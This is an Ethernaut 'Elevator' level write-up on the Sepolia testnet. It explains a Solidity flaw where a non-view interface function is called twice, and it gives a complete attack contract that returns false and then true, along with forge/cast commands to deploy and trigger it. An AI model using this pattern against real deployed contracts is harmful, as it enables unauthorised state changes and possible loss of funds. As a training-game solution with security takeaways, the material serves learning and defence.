# 11 - Elevator

## Overview

- **Difficulty:** 4/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x3A972992078d0F3994b2deade57Aa99198AAf27B`](https://sepolia.etherscan.io/address/0x3A972992078d0F3994b2deade57Aa99198AAf27B)
- **Attack Contract (`ElevatorCaller`):** [`0xe3b09f22100124940c2a5ff3b6e3494a2beb91f8`](https://sepolia.etherscan.io/address/0xe3b09f22100124940c2a5ff3b6e3494a2beb91f8)
- **Transactions:**
  - **1. Deploy (`ElevatorCaller`):** [`0x7369d95911dfd02a400400cfa1dd62fd887fc8441c8eb5421da1f9b168e7130b`](https://sepolia.etherscan.io/tx/0x7369d95911dfd02a400400cfa1dd62fd887fc8441c8eb5421da1f9b168e7130b)
  - **2. Exploit (`callElevator()`):** [`0x41c23d1f52ecd2bec35e6a74b641b465737fdee07a97dc7f794e35cc7df5ad6b`](https://sepolia.etherscan.io/tx/0x41c23d1f52ecd2bec35e6a74b641b465737fdee07a97dc7f794e35cc7df5ad6b)
  - **3. Level Submission:** [`0x609a6e2f08cf37bdbef576003649dd75b14e8c1675bbd44dff2c310aa5f5bb91`](https://sepolia.etherscan.io/tx/0x609a6e2f08cf37bdbef576003649dd75b14e8c1675bbd44dff2c310aa5f5bb91)

---

## Objective

Reach the top of the building by setting the `top` state variable in the `Elevator` contract to `true`.

---

## Contract Analysis

The target contract is [`src/11-elevator/Elevator.sol`](./Elevator.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

---

### Vulnerability Breakdown: Trusting Untrusted Interface Implementations

The vulnerability stems from two critical design mistakes:

1. **`isLastFloor` Is Not Marked `view` or `pure`:**
   ```solidity
   interface Building {
       function isLastFloor(uint256) external returns (bool);
   }
   ```
   Because the interface definition omits the `view` keyword, the EVM invokes `isLastFloor` using a standard `CALL` rather than a `STATICCALL`. This allows the callee to freely modify state between calls!

2. **Assumption of Idempotency:**
   The `goTo` function calls `building.isLastFloor(...)` **twice** in the exact same transaction:
   ```solidity
   if (!building.isLastFloor(_floor)) { // Call #1
       floor = _floor;
       top = building.isLastFloor(floor); // Call #2
   }
   ```
   The contract developers naively assumed that `isLastFloor` would return the exact same boolean on both invocations. However, because `msg.sender` controls the implementation, an attacker can return `false` on the first call to enter the `if` branch, and return `true` on the second call to flip `top = true`!

---

## Attack Contract

The exploit is implemented in [`src/11-elevator/ElevatorCaller.sol`](./ElevatorCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "./Elevator.sol";

contract ElevatorCaller {
    Elevator private immutable i_elevator;
    bool private isTopFloor;

    constructor(address _elevator) {
        i_elevator = Elevator(_elevator);
        isTopFloor = true;
    }

    function isLastFloor(uint256) external returns (bool) {
        isTopFloor = !isTopFloor;
        return isTopFloor;
    }

    function callElevator() external {
        i_elevator.goTo(1);
    }
}
```

### Exploit Mechanics (The Boolean Flip)

```text
1. isTopFloor initialized to true

2. callElevator() -> Elevator.goTo(1)
   │
   ├── Call 1: if (!building.isLastFloor(1))
   │     └── isTopFloor = !true => false
   │     └── returns false
   │     └── !false is TRUE => Enter if block!
   │
   └── Call 2: top = building.isLastFloor(1)
         └── isTopFloor = !false => true
         └── returns true
         └── top = true! 🎯
```

---

## Step-by-Step Exploit Walkthrough

### 1. Deploy `ElevatorCaller`

Deploy `ElevatorCaller`, passing the `Elevator` instance address to the constructor:

```bash
forge create src/11-elevator/ElevatorCaller.sol:ElevatorCaller \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME> \
  --broadcast \
  --constructor-args 0x3A972992078d0F3994b2deade57Aa99198AAf27B
```

- **Deploy Tx:** [`0x7369d95911dfd02a400400cfa1dd62fd887fc8441c8eb5421da1f9b168e7130b`](https://sepolia.etherscan.io/tx/0x7369d95911dfd02a400400cfa1dd62fd887fc8441c8eb5421da1f9b168e7130b)
- **Deployed Address:** [`0xe3b09f22100124940c2a5ff3b6e3494a2beb91f8`](https://sepolia.etherscan.io/address/0xe3b09f22100124940c2a5ff3b6e3494a2beb91f8)

### 2. Trigger the Exploit

Invoke `callElevator()` to initiate the elevator trip:

```bash
cast send 0xe3b09f22100124940c2a5ff3b6e3494a2beb91f8 "callElevator()" \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

- **Exploit Tx:** [`0x41c23d1f52ecd2bec35e6a74b641b465737fdee07a97dc7f794e35cc7df5ad6b`](https://sepolia.etherscan.io/tx/0x41c23d1f52ecd2bec35e6a74b641b465737fdee07a97dc7f794e35cc7df5ad6b)

### 3. Verify `top == true`

Query the `top` state variable on `Elevator`:

```bash
cast call 0x3A972992078d0F3994b2deade57Aa99198AAf27B "top()(bool)" --rpc-url sepolia
# Output: true
```

### 4. Submit Level

Submit the instance on Ethernaut:

- **Submission Tx:** [`0x609a6e2f08cf37bdbef576003649dd75b14e8c1675bbd44dff2c310aa5f5bb91`](https://sepolia.etherscan.io/tx/0x609a6e2f08cf37bdbef576003649dd75b14e8c1675bbd44dff2c310aa5f5bb91)

---

## Key Security Takeaways

1. **Mark Query Methods as `view` or `pure`:**
   Always enforce `view` or `pure` in interfaces and contract functions that are solely intended to read state. In Solidity, calling a `view` function emits the `STATICCALL` opcode, which reverts if the target contract attempts to modify state.
2. **Never Trust External Contracts for Internal Invariants:**
   Do not rely on an external caller's interface to validate whether your contract should transition state. State transitions should be evaluated against your contract's own internal storage variables.
3. **Do Not Rely on Call Result Consistency:**
   Never assume multiple external calls to untrusted addresses will yield consistent or idempotent return values.
